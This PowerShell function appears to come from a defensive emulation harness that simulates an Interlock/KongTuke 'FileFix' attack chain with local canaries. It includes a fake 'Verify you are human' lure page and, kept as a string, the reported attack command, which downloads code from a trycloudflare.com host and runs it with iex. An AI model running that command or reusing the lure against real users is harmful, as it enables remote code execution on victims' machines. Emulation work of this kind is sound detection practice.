function Invoke-InterlockWebInjectFileFix {
    param([Parameter(Mandatory)][System.Collections.IDictionary]$Paths)
    $time = Get-InterlockTimeline

    $compromisedPage = @'
<!doctype html><html><head><meta charset="utf-8"><title>Document Portal</title></head>
<body>
<h1>Document Portal</h1>
<p>Local KongTuke web-inject canary. No remote script is loaded.</p>
<button id="verify">Verify you are human</button>
<section id="steps" hidden>
  <h2>Verification steps</h2>
  <ol><li>Open the Windows Run dialog or File Explorer address bar.</li><li>Paste the clipboard content.</li><li>Press Enter.</li></ol>
</section>
<script data-injected-cluster="LandUpdate808/KongTuke">
document.getElementById('verify').onclick = () => document.getElementById('steps').hidden = false;
</script>
</body></html>
'@
    Write-InterlockEvidenceFile -Path (Join-Path $Paths.Web 'compromised-page.html') -Content $compromisedPage -Purpose 'local compromised-site web inject and fake verification flow' -Timestamp $time.WebInject

    $reportedCommand = '"powershell.exe" -ep Bypass -w H -c "schtasks /delete /tn Updater /f; $w=New-Object System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\") ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\") | iex"'
    $clipboardRecord = @"
INTERLOCK FILEFIX CLIPBOARD CANARY
The real clipboard is not modified. The report command is retained below for investigation only.
$reportedCommand
"@
    Write-InterlockEvidenceFile -Path (Join-Path $Paths.Evidence 'clipboard-canary.txt') -Content $clipboardRecord -Purpose 'FileFix/Run-dialog clipboard representation without changing the user clipboard' -Timestamp $time.FileFix

    $powerShellDecoy = Join-Path $Paths.Payloads 'powershell.exe'
    New-InterlockBinaryDecoy -Path $powerShellDecoy -Role 'PowerShell FileFix command-line canary; copied cmd only'
    Invoke-InterlockDecoyProcess -FilePath $powerShellDecoy -ReportedCommandLine $reportedCommand
    Invoke-InterlockLoopbackEndpoint -HostName 'deadly-programming-attorneys-our.trycloudflare.com' -Port 443 -Path '/'

    Write-InterlockEvidenceFile -Path (Join-Path $Paths.Evidence 'scheduled-task-delete-canary.json') -Content '{"taskName":"Updater","reportedAction":"delete","actualTaskOperation":false}' -Purpose 'reported schtasks deletion represented without querying or deleting a task' -Timestamp $time.FileFix.AddMinutes(1)

    Add-InterlockTimelineEvent -Timestamp $time.WebInject -Phase 'Initial Access' -Event 'Compromised website contained a KongTuke/LandUpdate808 single-line web inject and fake human verification.' -Details @{ remoteWebsiteLoaded = $false; scriptExecuted = $false }
    Add-InterlockTimelineEvent -Timestamp $time.FileFix -Phase 'User Execution' -Event 'FileFix/verification instructions and clipboard PowerShell command represented without modifying the clipboard or executing PowerShell.' -Details @{ DownloadString = $false; InvokeExpression = $false; scheduledTaskDeleted = $false; C2ActualDestination = '127.0.0.1' }
}
